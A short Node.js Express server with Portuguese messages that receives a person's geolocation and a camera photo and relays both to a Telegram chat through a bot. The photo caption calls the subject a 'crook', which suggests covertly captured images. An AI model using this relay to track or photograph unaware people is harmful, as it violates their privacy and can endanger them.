const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
const FormData = require("form-data");

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: "10mb" }));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.post("/send-data", async (req, res) => {
  const { latitude, longitude, maps, image } = req.body;

  try {
    if (!image || !image.startsWith("data:image/jpeg;base64,")) {
      return res.status(400).json({ success: false, message: "Imagem não válida." });
    }

    const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
    const filePath = path.join(__dirname, "temp_photo.jpg");

    fs.writeFileSync(filePath, base64Data, "base64");

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: `📍 Localização:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`,
    });

    const formData = new FormData();
    formData.append("chat_id", TELEGRAM_CHAT_ID);
    formData.append("photo", fs.createReadStream(filePath));
    formData.append("caption", "📸 carinha do meliante kKk");

    const response = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
      formData,
      { headers: formData.getHeaders() }
    );

    fs.unlinkSync(filePath);

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Erro ao enviar:", error.response?.data || error.message);
    res.status(500).json({ success: false });
  }
});

app.listen(8088, () => {
  console.log("Servidor rodando na porta 8088");
});
